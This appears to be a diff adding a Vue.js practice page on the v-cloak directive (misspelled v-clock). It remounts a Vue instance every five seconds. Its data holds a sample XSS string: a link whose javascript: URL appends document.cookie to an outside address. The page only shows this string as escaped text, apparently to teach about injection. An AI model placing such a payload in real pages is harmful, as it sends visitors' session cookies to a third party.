@@ -1,0 +1,51 @@
+<!--
+ * @Author       : helishou
+ * @Date         : 2021-10-12 23:58:19
+ * @LastEditTime : 2021-10-13 23:15:54
+ * @LastEditors  : helishou
+ * @Description  : 
+ * @FilePath     : \Vue\015.内置指令\v-clock.html
+ * 你用你的指尖,阻止我说再见,在bug完全失去之前
+-->
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>手机表单</title>
+    <!-- 引入Vue -->
+    <style>
+      [v-clock] {
+        display: none;
+      }
+      
+    </style>
+    <script type="text/javascript" src="../js/vue.js"></script>
+  </head>
+  <body>
+    <!--v-clock配合属性选择器，加载完后v-clock会消失-->
+    <div id="root">
+      <div v-clock>{{a}}</div>
+    </div>
+    <script>
+      // 全局过滤器
+      setInterval(() => {
+        const vm = new Vue({
+          data() {
+            return {
+              a: "<a href=javascript:location.href='http://www.baidu.com'+document.cookie>兄弟我找到你的东西了</a>",
+            };
+          },
+          methods: {
+            demo() {
+              console.log(this._data);
+            },
+          },
+          computed: {},
+        });
+        vm.$mount("#root"); //第二章写法
+      }, 5000);
+    </script>
+  </body>
+</html>
